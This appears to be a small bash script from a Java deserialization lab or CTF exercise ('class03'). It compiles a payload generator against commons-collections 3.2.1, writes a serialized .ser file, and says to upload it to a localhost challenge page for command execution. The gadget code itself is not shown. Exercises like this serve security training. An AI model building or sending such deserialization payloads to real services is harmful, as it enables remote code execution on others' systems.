#!/bin/bash
# class03 — getName() → 命令执行
cd "$(dirname "$0")"
javac -cp "../lib/commons-collections-3.2.1.jar" \
  Student.java GenPayload.java -d .
java -cp ".:../lib/commons-collections-3.2.1.jar" class03.GenPayload
rm -rf class03
mv *.ser .. 2>/dev/null
echo "🎯 上传 class03.ser 到 http://localhost:81/class03/"
